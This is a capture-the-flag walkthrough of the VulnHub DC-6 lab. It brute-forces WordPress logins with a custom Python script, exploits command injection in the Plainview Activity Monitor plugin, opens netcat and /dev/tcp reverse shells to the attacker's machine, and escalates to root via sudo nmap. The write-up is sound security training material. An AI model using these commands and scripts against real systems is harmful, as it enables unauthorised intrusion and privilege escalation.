title: VulnHub - DC 6
---

**Description:** Another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

**Author:** DCAU

**Operating System:** Linux

**Aim:** To get root and read the one and only flag.

**Download:** [https://www.vulnhub.com/entry/dc-6,315/](https://www.vulnhub.com/entry/dc-6,315/)

## Information Gathering
### Host Discovery

To discover the target host a ping scan was performed, the script you can download it [here](https://github.com/s4rgaz/hdiscovery.git).

```bash
root@kali:~$ hdiscovery.py -r 192.168.179.0/24
192.168.179.187 => up
```

### Port Scanning

A full TCP port scan was done with nmap in order to detect open ports on the server.

```bash
root@kali:~$ nmap -n -v -p- -T4 --open 192.168.179.187 -oG nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Enumeration

With the aim to obtain more information on the open ports, an aggressive scan was performed, it enables service and OS detection, script scanning and traceroute.

```bash
root@kali:~$ nmap -A -n -v -p22,80 192.168.179.187 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:

|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
```

### Web Enumeration

For the web page to be resolved correctly we must edit the **/etc/hosts** file on the attacking machine, as shown below.

```bash
root@kali:~$ echo "192.168.179.187 wordy" >> /etc/hosts
```

The first scanning with wpscan discovered some wordpress users.

```bash
root@kali:~$ wpscan --url http://wordy/ --enumerate vp,vt,u 
...

```

I saved the users into a file to brute force later.

```bash
root@kali:~$ echo -e "admin\ngraham\njens\nmark\nsarah" > users.txt 
```

A further scan with wpscan reveals the **plainview-activity-monitor** plugin.

```bash
root@kali:~$ wpscan --url http://wordy/ --plugins-detection aggressive

```

A google search reveals that it is vulnerable to OS command injection, but to exploit this vulnerability we need to log in.

We use the hint in the description of the machine at the time of download it, which specifies that the password starts with **k01** in the rockyou.txt to brute force.

```bash
root@kali:~$ zcat /usr/share/wordlists/rockyou.txt.gz | grep 'k01' > passwords.txt
```

I developed the following python script to perform a dictionary attack against the wordpress login form.

```python
#!/usr/bin/env python3

import requests
import sys
import argparse
from colorama import init, Fore

parser = argparse.ArgumentParser(description='Wordpress brute forecer.')
parser.add_argument('--url', metavar='URL', help='Wordpress login url')
parser.add_argument('-l', metavar='USER', help='Wordpress user')
parser.add_argument('-L', metavar='USERFILE', help='Users file')
parser.add_argument('-P', metavar='PASSFILE', help='Password file')
args = parser.parse_args()

url = args.url
user = args.l
users_file = args.L
password_file = args.P

init()
green = Fore.GREEN
yellow = Fore.YELLOW
gray = Fore.LIGHTBLACK_EX
reset = Fore.RESET

def login(user, passwd):
    data={
            'log':user,
            'pwd':passwd,
            'wp-submit':'Log+In'
            }

    try:
        r = requests.post(url, data=data)
        return r.text
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)


wordlist = open(password_file).read().splitlines()

def checkLogin():
    for passwd in wordlist:
        if "ERROR" in login(user,passwd):
            print(f"{gray}Trying => {user}:{passwd}{reset:20}", end="\r")
        else:
            print(f"{green}Found => {user}:{passwd}{reset:20}")
            break

if users_file:
    users = open(users_file).read().splitlines()
    for user in users:
        checkLogin()
elif user:
    checkLogin()
```

We run the script as shown below. 

```bash
root@kali:~$ python3 wpforce.py --url http://wordy/wp-login.php -L users.txt -P passwords.txt 
Found => mark:helpdesk01
```

In the obtained result we find mark's password, and log in.

## Exploitation
### Command Injection

The Plainview Activity Monitor plugin before 20180826 for WordPress is vulnerable to OS command injection via shell metacharacters in the ip parameter of a wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools request. 

The POC (Proof of Concept) you can download it [here](https://www.exploit-db.com/exploits/45274).

Following the instructions, we need to inject the **IP or integer** field, start BurpSuite and check if the **Intercept is on** button is enabled, then we type an IP address and click on **Convert**.

![](/assets/images/dc6/screenshot-4.png)

The request was intercepted, then we set up a netcat listener on port 443 and typed the following netcat command as shown bellow.

```bash
192.168.179.187 | nc 192.168.179.1 443 -e /bin/bash
```

![](/assets/images/dc6/screenshot-5.png)

We have obtained a shell with low privileges.

```bash
root@kali:~$ nc -vlnp 443              
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.187] 38106
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@dc-6:/var/www/html/wp-admin$
```

Listing mark's home directory, graham's password was found in a note.

```bash
www-data@dc-6:/home/mark$ ls
ls
stuff
www-data@dc-6:/home/mark$ cat stuff/things-to-do.txt
cat stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
www-data@dc-6:/home/mark$
```

We switch to the user graham. 

```bash
www-data@dc-6:/home/mark$ su - graham
su - graham
Password: GSo7isUM1D4

graham@dc-6:~$ id
id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
graham@dc-6:~$
```

User graham has sudo permissions to execute the **/home/jens/backups.sh**  script as user **jens** with no password.

```bash
graham@dc-6:~$ sudo -l  
sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
graham@dc-6:~$
```

We see that the script has execution privileges for all users, since **graham** belongs to the (devs) group it was possible to read the bash sciript and even write it.

```bash
graham@dc-6:~$ ls -la /home/jens/backups.sh
ls -la /home/jens/backups.sh
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh

graham@dc-6:~$ cat /home/jens/backups.sh
cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:~$
```

We add the following bash reverse shell to **/home/jens/backups.sh**.

```bash
graham@dc-6:~$ echo "bash -i >& /dev/tcp/192.168.179.1/443 0>&1" >> /home/jens/backups.sh
```

We start a netcat listener on port 443 and execute the following command on the server.

```bash
graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
```

We have obtained a shell as user **jens**.

```bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.187] 38108
jens@dc-6:/home/graham$
```

The jeans user has permissions to execute the nmap binary as root with no password.

```bash
jens@dc-6:/home/graham$ sudo -l
sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
jens@dc-6:/home/graham$
```

## Privilege Escalation
### Sudo Permissions

An excellent guide to escalating privileges through this means you can found it in the [GTFOBINS](https://gtfobins.github.io/gtfobins/nmap/#sudo) cheat sheet.

Breaking down the nmap command, we create the **/tmp/shell** file that contains the instruction to execute an interactive **bash**, then through the NSE (Nmap Scripting Engine) it execute the **/tmp/shell** script that invokes a root shell.

```bash
jens@dc-6:/home/graham$ echo 'os.execute("/bin/bash -i")' > /tmp/shell
echo 'os.execute("/bin/bash -i")' > /tmp/shell
jens@dc-6:/home/graham$ sudo nmap --script /tmp/shell
sudo nmap --script /tmp/shell

Starting Nmap 7.40 ( https://nmap.org ) at 2022-01-10 06:53 AEST
NSE: Warning: Loading '/tmp/shell' -- the recommended file extension is '.nse'.
root@dc-6:/home/graham#
```

We go to the root directory and read the flag.

```bash
root@dc-6:/home/graham# cd /root
cd /root
root@dc-6:~# ls
ls
theflag.txt
root@dc-6:~# cat theflag.txt
cat theflag.txt
